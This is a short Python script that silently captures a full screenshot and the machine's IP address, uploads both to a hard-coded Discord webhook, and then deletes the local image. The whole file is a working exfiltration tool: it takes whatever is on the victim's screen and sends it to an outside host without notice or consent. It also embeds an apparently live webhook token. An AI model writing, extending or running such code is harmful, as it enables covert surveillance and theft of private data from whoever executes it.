import os
import requests
from PIL import ImageGrab
import socket

# Define the webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1245013270088253473/PrDXaeWwmrAeLpbfa_nsBP_4r3-T4lCg6S1w4zEkHq_-E3QqICRbdhJQr0N3IjNsS0xy'

def capture_screenshot(filename):
    """Capture a screenshot and save it to a file."""
    screenshot = ImageGrab.grab()
    screenshot.save(filename)

def get_ip_address():
    """Get the local IP address of the machine."""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        return str(e)

def send_to_webhook(image_path, ip_address):
    """Send the screenshot and IP address to the Discord webhook."""
    with open(image_path, 'rb') as image_file:
        image_data = image_file.read()
    
    # Send the screenshot
    files = {'file': ('screenshot.png', image_data, 'image/png')}
    response = requests.post(WEBHOOK_URL, files=files)
    
    # Send the IP address as a message
    payload = {
        'content': f"IP Address: {ip_address}"
    }
    response = requests.post(WEBHOOK_URL, json=payload)

    if response.status_code == 204:
        print("Successfully sent to webhook.")
    else:
        print(f"Failed to send to webhook. Status code: {response.status_code}")

def main():
    # Define the screenshot file path
    screenshot_path = 'screenshot.png'
    
    # Capture the screenshot
    capture_screenshot(screenshot_path)
    
    # Get the IP address
    ip_address = get_ip_address()
    
    # Send screenshot and IP address to webhook
    send_to_webhook(screenshot_path, ip_address)
    
    # Clean up
    os.remove(screenshot_path)

if __name__ == '__main__':
    main()

